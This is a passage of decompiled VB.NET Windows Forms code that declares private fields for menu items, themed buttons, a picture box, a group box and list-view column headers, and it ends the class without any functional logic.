		<AccessedThroughProperty("FindToolStripMenuItem")>
		Private _FindToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001FB RID: 507
		<AccessedThroughProperty("RemoveEmptyPWToolStripMenuItem")>
		Private _RemoveEmptyPWToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001FC RID: 508
		<AccessedThroughProperty("SaveFileDialog1")>
		Private _SaveFileDialog1 As SaveFileDialog

		' Token: 0x040001FD RID: 509
		<AccessedThroughProperty("ImageList1")>
		Private _ImageList1 As ImageList

		' Token: 0x040001FE RID: 510
		<AccessedThroughProperty("MenuStrip1")>
		Private _MenuStrip1 As MenuStrip

		' Token: 0x040001FF RID: 511
		<AccessedThroughProperty("ToolStripMenuItem1")>
		Private _ToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x04000200 RID: 512
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x04000201 RID: 513
		<AccessedThroughProperty("UserImage1")>
		Private _UserImage1 As UserImage

		' Token: 0x04000202 RID: 514
		<AccessedThroughProperty("FlatMini2")>
		Private _FlatMini2 As FlatMini

		' Token: 0x04000203 RID: 515
		<AccessedThroughProperty("FlatButton4")>
		Private _FlatButton4 As FlatButton

		' Token: 0x04000204 RID: 516
		<AccessedThroughProperty("PictureBox4")>
		Private _PictureBox4 As PictureBox

		' Token: 0x04000205 RID: 517
		<AccessedThroughProperty("FlatButton2")>
		Private _FlatButton2 As FlatButton

		' Token: 0x04000206 RID: 518
		<AccessedThroughProperty("FlatGroupBox1")>
		Private _FlatGroupBox1 As FlatGroupBox

		' Token: 0x04000207 RID: 519
		<AccessedThroughProperty("L1")>
		Private _L1 As GClass9

		' Token: 0x04000208 RID: 520
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x04000209 RID: 521
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x0400020A RID: 522
		<AccessedThroughProperty("ColumnHeader3")>
		Private _ColumnHeader3 As ColumnHeader

		' Token: 0x0400020B RID: 523
		<AccessedThroughProperty("ColumnHeader4")>
		Private _ColumnHeader4 As ColumnHeader

		' Token: 0x0400020C RID: 524
		<AccessedThroughProperty("ColumnHeader5")>
		Private _ColumnHeader5 As ColumnHeader

		' Token: 0x0400020D RID: 525
		Private bool_0 As Boolean
	End Class
End Namespace
